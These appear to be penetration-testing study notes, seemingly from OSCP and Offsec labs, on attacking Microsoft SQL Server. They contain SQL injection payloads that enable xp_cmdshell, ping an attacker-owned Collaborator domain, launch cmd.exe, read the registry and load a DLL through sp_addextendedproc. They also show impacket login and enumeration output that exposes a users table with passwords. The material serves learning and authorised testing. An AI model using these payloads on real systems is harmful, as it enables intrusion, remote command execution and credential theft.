
INIT
# MSSQL
A [DBMS](../../coding/databases/DBMS.md) which works natively w/ Windows. The built-in command line tool for working with MSSQL is `SQLCMD`.  `SQLCMD` allows [SQL](../../coding/languages/SQL.md) queries to be ran through Windows Command prompt or *remotely from another device.*
# MSSQLi (SQL Injection)
## Manual Testing
### `xp_cmdshell`
If you've verified that you can execute commands via `xp_cmdshell` with your injection, then you can use it to execute MSSQL's stored procedures. To execute stored procedures you need to have *admin access*. Additionally, it is *disabled by default*, so you need to make sure to *enable it* first.
#### Enabling `xp_cmdshell`
With admin access, you can enable procedures as follows:
```sql
EXEC sp_configure 'show advanced options',1 
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1 
RECONFIGURE
```
#### Verify Execution w/ `ping`
One easy way to check for code execution in a [blind-SQLi](../../OSCP/web-apps/SQLi/blind-SQLi.md) MSSQLi is to use the `ping` command from `xp_cmdshell`. Have it ping an IP address or domain that you own. For example, you could use [burp-suite](../../cybersecurity/TTPs/delivery/tools/burp-suite.md)'s Collaborator to generate a domain to ping.

Example injection:
```sql
admin'; EXEC master.dbo.xp_cmdshell 'ping ymomnqqz95p67xfo6rfj3px7jyppdf14.oastify.com'--
```
Collaborator: (received two DNS requests)
![](../../OSCP/challenge-labs/challenge-labs-pics/medtech-1.png)
#### Getting a Shell
Typical payload to get the command prompt:
```sql
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'--
```
#### Performing registry operations in SQL Server (S)
Stored procedures can also be used to perform various registry operations. Some of these are undocumented and may change:
-  `xp_regaddmultistring`
-  `xp_regdeletekey`
-  `xp_regdeletevalue`
-  `xp_regenumkeys`
-  `xp_regenumvalues`
-  `xp_regread`
-  `xp_regremovemultistring`
-  `xp_regwrite`
An example of using the `xp_regread` procedure:
```sql
'; exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares' 
exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'--
```
#### `sp_addextendedproc`
You can also use `sp_addextendedproc` to add a new procedure, which basically lets you execute arbitrary code: 
```sql
'; sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'--
';exec xp_webserver--
```
#### Other useful stored procedures for SQL Server: 
- Managing services: `xp_servicecontrol`
- Listing storage media: `xp_availablemedia`
- Listing ODBC resources: `xp_enumdsn`
- Managing the login mode: `xp_loginconfig`
- Creating CAB files: `xp_makecab`
- Listing domains: `xp_ntsec_enumdomains`
- Process termination (you need to know the PID): `xp_terminate_process`
- Writing an HTML file to a UNC or internal path: `sp_makewebtask`
## TDS & `impacket`
Tabular Data Stream is a network protocol used by MSSQL and implemented into the [impacket](../../cybersecurity/TTPs/exploitation/tools/impacket.md) Python framework. We can use `impacket-mssqlclient` from Impacket to interact with a MSSQL instance.
### `impacket-mssqlclient`
To connect to a remote machine running MSSQL, we can use Impacket's `impacket-mssqlclient` tool. To do so, we provide a username, password, and remote [IP address](../../networking/OSI/3-network/IP-addresses.md) as well as the `windows-auth` keyword:
```bash
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (SQLPLAYGROUND\Administrator  dbo@master)>
```
The `windows-auth` flag *forces [NTLM](../../networking/protocols/NTLM.md) authentication* instead of [kerberos](../../networking/protocols/kerberos.md).  Once we connect to the MSSQL instance, we can inspect the currently running version using the `@@version` command:
#### `@@version`
```sql
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT @@version;
...

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
	Sep 24 2019 13:48:23
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)
```
#### Listing databases
```sql
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
name
...
master

tempdb

model

msdb

offsec

SQL>
```
Out of the databases listed, only the one named "offsec" is custom. The others are *all default databases* that come with MSSQL. `sys.databases` is the "system catalog."
#### Querying a database
If we want to look at the "offsec" database, we can use a SQL query:
```sql
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
offsec          dbo            users        b'BASE TABLE'   

SQL (SQLPLAYGROUND\Administrator  dbo@master)> 
```
The only table listed is the `users` table.
#### Inspecting a table
To inspect a table, we need to specify the `dbo` table schema *between the database and the table's name*:
```sql
SQL>select * from offsec.dbo.users;
username     password     
----------   ----------   
admin        lab        

guest        guest 
```
The out shows that the `users` table only has two columns: `username` and `password`. There are only two users listed in the table `admin` and `guest`. 

> [!Resources]
> - [Offsec](offsec.com)
> - [Invicti: SQLi Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)

> [!Related]
> - [`mssqlclient.py`](../../cybersecurity/TTPs/exploitation/tools/impacket.md#`mssqlclient.py`) Impacket tool